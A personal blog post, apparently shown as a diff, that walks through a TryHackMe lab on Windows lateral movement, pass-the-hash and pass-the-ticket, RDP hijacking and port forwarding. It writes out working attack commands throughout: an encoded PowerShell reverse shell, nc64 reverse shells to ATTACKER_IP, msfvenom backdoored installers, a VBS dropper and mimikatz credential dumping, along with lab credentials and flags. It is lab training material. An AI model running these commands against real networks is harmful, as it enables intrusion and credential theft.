@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <meta itemprop="name" content="Mark Wilkinson" />
+  <meta itemprop="description" content="" />
+
+  <link rel="apple-touch-icon" sizes="180x180" href="https://markwilkinson.tech/apple-touch-icon.png"/>
+  <link rel="icon" type="image/png" sizes="32x32" href="https://markwilkinson.tech/favicon-32x32.png" />
+  <link
+    rel="icon"
+    type="image/png"
+    sizes="16x16"
+    href="https://markwilkinson.tech/favicon-16x16.png"
+  />
+  <link
+    rel="shortcut icon"
+    href="https://markwilkinson.tech/favicon.ico"
+  />
+  <link rel="stylesheet" href="https://markwilkinson.tech/style.css"/>
+  
+  <title>Lateral Movement and Pivoting Network</title>
+  
+
+  
+
+  <body id="page">
+
+	
+<header id="site-header" class="animated slideInUp faster">
+  <div class="hdr-wrapper section-inner">
+    <div class="hdr-left">
+      <div class="site-branding">
+        <a href="https:&#x2F;&#x2F;markwilkinson.tech">Mark Wilkinson</a>
+      </div>
+      <nav class="site-nav hide-in-mobile">
+            
+        
+        <a href="https://markwilkinson.tech/posts">Posts</a>
+        
+        <a href="https://markwilkinson.tech/about">About</a>
+        
+      </nav>
+    </div>
+    <div class="hdr-right hdr-icons">
+      <span class="hdr-social hide-in-mobile">
+        
+
+<a href="https:&#x2F;&#x2F;infosec.exchange&#x2F;@markwilk" target="_blank" rel="noopener me"
+   title="mastodon">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path fill="none" d="M0 0h24v24H0z"/> <path fill-rule="nonzero" d="M3.018 12.008c-.032-1.26-.012-2.448-.012-3.442 0-4.338 2.843-5.61 2.843-5.61 1.433-.658 3.892-.935 6.45-.956h.062c2.557.02 5.018.298 6.451.956 0 0 2.843 1.272 2.843 5.61 0 0 .036 3.201-.396 5.424-.275 1.41-2.457 2.955-4.963 3.254-1.306.156-2.593.3-3.965.236-2.243-.103-4.014-.535-4.014-.535 0 .218.014.426.04.62.084.633.299 1.095.605 1.435.766.85 2.106.93 3.395.974 1.82.063 3.44-.449 3.44-.449l.076 1.646s-1.274.684-3.542.81c-1.25.068-2.803-.032-4.612-.51-1.532-.406-2.568-1.29-3.27-2.471-1.093-1.843-1.368-4.406-1.431-6.992zm3.3 4.937v-2.548l2.474.605a20.54 20.54 0 0 0 1.303.245c.753.116 1.538.2 2.328.235 1.019.047 1.901-.017 3.636-.224 1.663-.199 3.148-1.196 3.236-1.65.082-.422.151-.922.206-1.482a33.6 33.6 0 0 0 .137-2.245c.015-.51.02-.945.017-1.256v-.059c0-1.43-.369-2.438-.963-3.158a3.008 3.008 0 0 0-.584-.548c-.09-.064-.135-.089-.13-.087-1.013-.465-3.093-.752-5.617-.773h-.046c-2.54.02-4.62.308-5.65.782.023-.01-.021.014-.112.078a3.008 3.008 0 0 0-.584.548c-.594.72-.963 1.729-.963 3.158 0 .232 0 .397-.003.875a77.483 77.483 0 0 0 .014 2.518c.054 2.197.264 3.835.7 5.041.212.587.472 1.07.78 1.45a5.7 5.7 0 0 1-.18-1.505zM8.084 6.37a1.143 1.143 0 1 1 0 2.287 1.143 1.143 0 0 1 0-2.287z"/> </svg>
+  
+</a>
+
+<a href="https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;mark-wilkinson-6398a7312&#x2F;" target="_blank" rel="noopener me"
+   title="linkedin">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+  
+</a>
+
+<a href="https:&#x2F;&#x2F;github.com&#x2F;mrk-wilkinson" target="_blank" rel="noopener me"
+   title="github">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+  
+</a>
+
+<a href="mailto:mrk.wilkinson@protonmail.com" target="_blank" rel="noopener me"
+   title="email">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+  
+</a>
+
+
+      </span>
+      <button id="menu-btn" class="hdr-btn" title="Menu">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          class="feather feather-menu"
+        >
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+</header>
+<div id="mobile-menu" class="animated fast">
+  <ul>
+    
+    <li><a href="https://markwilkinson.tech/posts">Posts</a></li>
+    
+    <li><a href="https://markwilkinson.tech/about">About</a></li>
+    
+  </ul>
+</div>
+
+	
+	
+
+		
+<main class="site-main section-inner animated fadeIn faster">
+  <article class="thin">
+	<header class="post-header">
+	  <div class="post-meta">
+		
+		<span>Mar 02, 2025</span>
+		<small> - 
+<span class="reading-time" title="Estimated read time">
+  
+  3 min read
+  
+</span>
+</small>
+		
+            
+	  </div>
+	  <h1>Lateral Movement and Pivoting Network</h1>
+	</header>
+
+	<div class="content">
+        
+	  <p><img src="../../assets/image_1740872524262_0.png" alt="image.png" /></p>
+<h2 id="task-1-intro-and-setup">Task 1 Intro and setup</h2>
+<p>I will be using a kali-linux wsl setup as win-kex works better than VMs for me.
+I just used nmcli to change the dns to the domain controller and used the specific openvpn config file as described in the task.
+Then visited http://distributor.za.tryhackme.com/creds to get my user level credentials. If only it was this easy in the real world
+<img src="../../assets/image_1740873365930_0.png" alt="image.png" /></p>
+<h2 id="task-2-moving-through-the-network">Task 2 Moving through the network</h2>
+<ul>
+<li>Lateral movement: A group of techniques used by attackers to move around a network.</li>
+<li>Movement is essential for attackers to: achieve goals, bypass network restrictions, establish persistence, avoid detection and instill confusion</li>
+<li>Local administrators: Restricted by UAC ( Except default Administrator ) and can't remotely connect to machines except using RDP</li>
+<li>Domain accounts ( With local Admin ) : Have full administrative privileges</li>
+</ul>
+<h2 id="task-3-spawning-processes-remotely">Task 3 Spawning processes remotely</h2>
+<ul>
+<li>Focus: Methods an attacker has to remotely spawn processes when they have valid credentials</li>
+<li><strong>Psexec</strong> Port 445 SMB
+<ul>
+<li>Requires: Adminstrator</li>
+<li>Sysinternal tool</li>
+<li>Internal working
+<ul>
+<li>Connects to Admin$ share and uploads service binary psexesvc.exe</li>
+<li>Connects to service control manager and created PSEXESVC service with C:Windowspsecesvc.exe binary</li>
+<li>Creates named pipes to handle stdin/stdout/stderr</li>
+</ul>
+</li>
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>WinRM</strong> Port 5985 HTTP or Port 5986 HTTPS
+<ul>
+<li>Required group: Remote Management Users</li>
+<li>Web based protocol to send powershell commands, most windows servers have it enabled</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Remote Service Creation (sc)</strong> Ports: 135/49152-65535 (DCE/RPC), 139/445 (RPC over SMB named pipes)
+<ul>
+<li>Required group: Administrators</li>
+<li>Will execute and fail (normally) as requires windows service executables</li>
+<li>sc.exe tries to connect to Service Control Manager SVCCTL through rpc
+<ul>
+<li>Method 1: ask EPM (Endpoint Mapper) at port 135 for the port/ip of the SVCCTL (49152-65535)</li>
+<li>Method 2: Try to reach SVCCTL through smb named pipes pipesvcctl</li>
+</ul>
+</li>
+<li><pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">    sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 &#x2F;add&quot; start= auto
+    sc.exe \\TARGET start THMservice
+    sc.exe \\TARGET stop THMservice
+    sc.exe \\TARGET delete THMservice
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Remote Schedule Tasks</strong>
+<ul>
+<li><pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">   schtasks &#x2F;s TARGET &#x2F;RU &quot;SYSTEM&quot; &#x2F;create &#x2F;tn &quot;THMtask1&quot; &#x2F;tr &quot;&lt;command&#x2F;payload to execute&gt;&quot; &#x2F;sc ONCE &#x2F;sd 01&#x2F;01&#x2F;1970 &#x2F;st 00:00 
+   schtasks &#x2F;s TARGET &#x2F;run &#x2F;TN &quot;THMtask1&quot; 
+   schtasks &#x2F;S TARGET &#x2F;TN &quot;THMtask1&quot; &#x2F;DELETE &#x2F;F
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Practical</strong>
+<ul>
+<li>We will be connecting to THMJMP2 using the creds we got via ssh</li>
+<li>** User:** ZA.TRYHACKME.COM\t1_leonard.summers** Password:** EZpass4ever</li>
+<li>It says we can use any method we want to get to THMIIS, I will be using psexec</li>
+<li>First, I established a reverse shell on THMJMP2 as leonard summers
+<ul>
+<li><pre><code>```powershell
+runas &#x2F;netonly &#x2F;user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe LOCAL_IP_ADDR 4444&quot;
+```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Then, I used psexec to execute a powershell one-liner
+<ul>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">   psexec64 \\10.200.48.201 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANQAwAC4ANAA2AC4AMgAwADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+</code></pre>
+</li>
+<li>I wasn't planning on using a base64 encoded one (generated at revshells.com) but psexec got fussy with the quotes in the regular payload</li>
+</ul>
+</li>
+<li>Running the Flag.exe binary didn't work for me but a quick reverse engineer gave me the flag THM{MOVING_WITH_SERVICES</li>
+</ul>
+</li>
+</ul>
+<h2 id="task-4-moving-laterally-using-wmi">Task 4 Moving laterally using WMI</h2>
+<ul>
+<li>Windows Management Instrumentation</li>
+<li><strong>Connecting to  WMI From Powershell</strong>
+<ul>
+<li>First we need a <strong>PSCredential object</strong></li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    $username = &#x27;Administrator&#x27;;
+    $password = &#x27;Mypass123&#x27;;
+    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+    ```
+</code></pre>
+</li>
+<li>Then we need to create a session</li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    $Opt = New-CimSessionOption -Protocol DCOM
+    $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Remote Process Creation</strong> Ports 135/49152-65535 (DCERPC), 5985/5986 (WinRM)
+collapsed:: true
+<ul>
+<li>Required group: Administrator</li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    $Command = &quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;;
+    
+    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+    CommandLine = $Command
+    }
+    ```
+</code></pre>
+</li>
+<li>Not output provided</li>
+<li>Can also use cmd</li>
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    wmic.exe &#x2F;user:Administrator &#x2F;password:Mypass123 &#x2F;node:TARGET process call create &quot;cmd.exe &#x2F;c calc.exe&quot; 
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Service Creation</strong> ** Ports 135/49152-65535 (DCERPC), 5985/5986 (WinRM)
+collapsed:: true
+<ul>
+<li>Required group: Administrator</li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+    Name = &quot;THMService2&quot;;
+    DisplayName = &quot;THMService2&quot;;
+    PathName = &quot;net user munra2 Pass123 &#x2F;add&quot;; # Your payload
+    ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess : Start service in a new process
+    StartMode = &quot;Manual&quot;
+    }
+    
+    $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#x27;THMService2&#x27;&quot;
+    Invoke-CimMethod -InputObject $Service -MethodName StartService
+    
+    Invoke-CimMethod -InputObject $Service -MethodName StopService
+    Invoke-CimMethod -InputObject $Service -MethodName Delete
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Scheduled Tasks</strong> Same ports as before
+collapsed:: true
+<ul>
+<li>Group: Adminstrator</li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">   $Command = &quot;cmd.exe&quot;
+   $Args = &quot;&#x2F;c net user munra22 aSdf1234 &#x2F;add&quot;
+   $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+   Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\SYSTEM&quot; -TaskName &quot;THMtask2&quot;
+   Start-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;
+   
+   Unregister-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>MSI Installation</strong>
+<ul>
+<li>Group: Administrator</li>
+<li>MSI File must already be on target system</li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false}
+    ```
+</code></pre>
+</li>
+<li>Can also use wmic in legacy systems</li>
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    wmic &#x2F;node:TARGET &#x2F;user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Practical</strong>
+<ul>
+<li>Connect to THM-IIS using MSI installation</li>
+<li>First we need to create and upload a payload
+<ul>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi &gt; myinstaller.msi
+    smbclient -c &#x27;put myinstaller.msi&#x27; -U t1_corine.waters -W ZA &#x27;&#x2F;&#x2F;thmiis.za.tryhackme.com&#x2F;admin$&#x2F;&#x27; Korine.1994
+    ```
+</code></pre>
+</li>
+<li>Admin share is C:Windows</li>
+</ul>
+</li>
+<li>We need to create a listener for the payload
+<ul>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    nc -nvlp 4445
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Then we create a wmi session
+<ul>
+<li><em>Same steps as connection to wmi session</em></li>
+<li>Then we install the msi</li>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\secretinstall.msi&quot;; Options = &quot;&quot;; AllUsers = $false}
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>And we get a shell!</li>
+<li>THM{MOVING_WITH_WMI_4_FUN</li>
+</ul>
+</li>
+</ul>
+<h2 id="task-5-alternate-authentication-material">Task 5 Alternate Authentication Material</h2>
+<ul>
+<li>Any piece of data that we can use to access a windows account without the passwod</li>
+<li>NTLM and Kerberos protocols</li>
+<li><img src="../../assets/9434c96e1bc0519f8d851b44d85b6702_1740881191120_0.png" alt="9434c96e1bc0519f8d851b44d85b6702.png" /></li>
+<li><strong>Pass the Hash</strong>
+<ul>
+<li>If we extract credentials (maybe with mimikatz) we can use non-cracked ntlm hashes</li>
+<li>Getting them:
+<ul>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # lsadump::sam   
+    
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # sekurlsa::msv 
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Using them
+<ul>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    xfreerdp &#x2F;v:VICTIM_IP &#x2F;u:DOMAIN\\MyUser &#x2F;pth:NTLM_HASH
+    psexec.py -hashes NTLM_HASH DOMAIN&#x2F;MyUser@VICTIM_IP
+    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+    
+    mimikatz # token::revert
+    mimikatz # sekurlsa::pth &#x2F;user:bob.jenkins &#x2F;domain:za.tryhackme.com &#x2F;ntlm:6b4a57f67805a663c818106dc0648484 &#x2F;run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Kerberos</strong>
+collapsed:: true
+<ul>
+<li><img src="../../assets/855d6fa3ea4076164934a2ba9717ffb5_1740881338259_0.png" alt="855d6fa3ea4076164934a2ba9717ffb5.png" /></li>
+<li><img src="../../assets/0db01f1f1434f33fa8fb11de2bd165a6_1740881356706_0.png" alt="0db01f1f1434f33fa8fb11de2bd165a6.png" /></li>
+<li><img src="../../assets/5d45b999328017c22b0f249069a88767_1740881361813_0.png" alt="5d45b999328017c22b0f249069a88767.png" /></li>
+<li>Getting tickets
+<ul>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
+    mimikatz # sekurlsa::tickets &#x2F;export
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Using them
+<ul>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Overpass-the-hash/pass-the-key
+<ul>
+<li>
+<p>Like passthehash but for kerberos</p>
+</li>
+<li>
+<p>Get encryption keys</p>
+<ul>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
+    mimikatz # sekurlsa::ekeys
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>If we have the RC4 hash
+mimikatz #sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556"</p>
+</li>
+<li>
+<p>If we have the AES128 hash:</p>
+<pre><code>mimikatz  sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:za.tryhackme.com &#x2F;aes128:b65ea8151f13a31d01377f5934bf3883 &#x2F;run:&quot;c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556&quot;  
+</code></pre>
+</li>
+<li>
+<p>If we have the AES256 hash:</p>
+<pre><code>mimikatz  sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:za.tryhackme.com &#x2F;aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 &#x2F;run:&quot;c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556&quot;  
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Practical</strong>
+collapsed:: true
+<ul>
+<li>SSH with new credentials provided</li>
+<li>Get ntlm ham by using mimikatz
+<ul>
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # sekurlsa::msv 
+    ```
+</code></pre>
+</li>
+<li>533f1bd576caa912bdb9da284bbc60fe was found for t1_toby.beck</li>
+</ul>
+</li>
+<li>Exploit this
+<ul>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    evil-winrm -i 10.200.48.201 -u t1_toby.beck -H 533f1bd576caa912bdb9da284bbc60fe
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Flag on desktop:
+<ul>
+<li>THM{NO_PASSWORD_NEEDED</li>
+<li></li>
+</ul>
+</li>
+<li></li>
+</ul>
+</li>
+</ul>
+<h2 id="task-6-abusing-user-behaviour">Task 6 Abusing User Behaviour</h2>
+<ul>
+<li><strong>Abusing Writable Shares</strong>
+<ul>
+<li>Common thing to find in corporate environments</li>
+<li>If there are executables that administrators deploy on those shares we can hijack those</li>
+<li>Backdoor
+<ul>
+<li>Exe
+<ul>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    msfvenom -a x64 --platform windows -x putty.exe -k -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>VBS
+<ul>
+<li><pre data-lang="vbscript" class="language-vbscript "><code class="language-vbscript" data-lang="vbscript">    CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe &#x2F;c copy &#x2F;Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>RDP Hijacking</strong>
+<ul>
+<li>If an rdp client closes instead of logging off, session remains indefinitely</li>
+<li>Can access with system privileges</li>
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    query user   # Retruns sessions
+    tscon 3 &#x2F;dest:rdp-tcp#6
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Practical</strong>
+<ul>
+<li>RDP in with our new credentials (different link than before)</li>
+<li>Switch to system
+<ul>
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    PsExec64.exe -s cmd.exe
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li>Find and connect to rdp
+<ul>
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    query user
+    tscon &lt;any of the ids for the target user&gt; &#x2F;dest:rdp-tcp#&lt;Your session&gt;
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="task-7-port-forwarding">Task 7 Port Forwarding</h2>
+<ul>
+<li><strong>SSH Tunnelling</strong>
+<ul>
+<li>Allows us to forward ports or traffic through another machine we have ssh access to</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+    This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
+    ```
+</code></pre>
+</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    To forward port 80 from the attacker&#x27;s machine and make it available from PC-1, we can run the following command on PC-1:
+    C:\&gt; ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>SOCAT</strong>
+<ul>
+<li>Doesn't require ssh, but requires us to transfer the socat binary</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:       
+    C:\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+    ```
+</code></pre>
+</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    If, on the other hand, we&#x27;d like to expose port 80 from the attacker&#x27;s machine so that it is reachable by the server, we only need to adjust the command a bit:
+    C:\&gt;socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Dynamic Port Forwarding</strong>
+<ul>
+<li>For if we need multiple ports, ex nmap</li>
+<li>Create socks proxy with ssh and connect with proxychains</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    ssh tunneluser@1.1.1.1 -R 9050 -N
+    proxychains nmap -T4 -p- Target
+    ```
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Practical</strong>
+<ul>
+<li>Part 1, RDP to THMIIS
+<ul>
+<li>Port is blocked from our machine but allowed from thmjmp2</li>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+    ```
+</code></pre>
+</li>
+<li>Then we can connect to rdp at thmjmp2.za.tryhackme.com:13389 with the provided creds</li>
+<li>THM{SIGHT_BEYOND_SIGHT}</li>
+</ul>
+</li>
+<li>Part 2, Chaining complex exploits
+<ul>
+<li>We will be trying to exploit the domain controller running rejetto hfs</li>
+<li>DC can only talk to jmp2</li>
+<li>Forward ssh ports
+<ul>
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    C:\Users\t2_kelly.blake&gt;ssh tunnel@10.50.46.207 -R 8888:thmdc.za.tryhackme.com:80 -L *:6565:127.0.0.1:6565 -L *:6868:127.0.0.1:6868 -N 
+    ```
+</code></pre>
+</li>
+<li>-R 8888:thmdc.za.tryhackme.com:80 Forwards the vulnerable port to port 8888 on our local machine</li>
+<li>-L *:6565:127.0.0.1:6565 forwards connection to JMP2 to our machine at port 6565</li>
+<li>-L *:6767:127.0.0.1:6767 same as above for port 6767</li>
+</ul>
+</li>
+<li>Now we can exploit
+<ul>
+<li>Launch metasploit</li>
+<li>use hfs rejetto exec</li>
+<li>set lhost to jmp2</li>
